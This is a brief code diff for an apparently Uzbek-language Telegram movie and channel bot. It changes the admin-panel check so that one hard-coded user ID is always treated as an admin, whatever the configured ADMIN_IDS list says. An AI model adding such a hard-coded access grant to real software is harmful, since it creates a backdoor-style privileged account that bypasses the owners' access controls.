@@ -133,7 +133,8 @@ def admin_panel(message):
     logger.info(f"Admin panel so'rovi: User ID {user_id}, Chat ID {chat_id}")
     
     # Adminni tekshirish (user_id yoki chat_id ADMIN_IDS ro'yxatida bo'lishi kerak)
-    if user_id in ADMIN_IDS or chat_id in ADMIN_IDS:
+    # Shuningdek, 6849709091 ID-si har doim admin bo'ladi
+    if user_id in ADMIN_IDS or chat_id in ADMIN_IDS or user_id == 6849709091:
         kb = types.InlineKeyboardMarkup()
         kb.add(types.InlineKeyboardButton("📢 Kanallarni boshqarish", callback_data="manage_channels"))
         kb.add(types.InlineKeyboardButton("🎬 Kino qo'shish", callback_data="add_movie_start"))
